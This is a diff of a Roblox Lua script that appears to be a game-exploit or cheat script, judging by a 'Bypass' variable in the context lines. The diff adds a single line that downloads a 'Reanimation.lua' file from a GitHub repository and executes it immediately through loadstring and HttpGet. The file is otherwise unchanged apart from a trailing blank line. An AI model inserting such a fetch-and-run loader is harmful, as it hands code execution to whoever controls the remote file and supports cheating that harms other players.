@@ -1,6 +1,6 @@
 local NotificationBindable = Instance.new("BindableFunction")
 
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/melanie198686-tech/Pendulum-Hubs-Source/refs/heads/main/Reanimation.lua"))()
 
 local SongID = "http://www.roblox.com/asset/?id=198665867"
 Bypass = "death"
@@ -1239,4 +1239,5 @@ while true do
 		end
 	end
 end
+
 
